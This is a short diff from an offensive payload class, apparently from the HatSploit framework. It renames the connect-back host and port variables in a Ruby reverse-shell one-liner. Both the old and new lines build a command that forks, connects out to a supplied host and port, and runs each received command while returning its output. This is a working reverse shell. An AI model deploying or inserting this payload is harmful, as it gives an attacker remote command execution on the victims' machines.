@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
-        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + connback_host + "\",\"" + connback_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + remote_host + "\",\"" + remote_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
         return payload
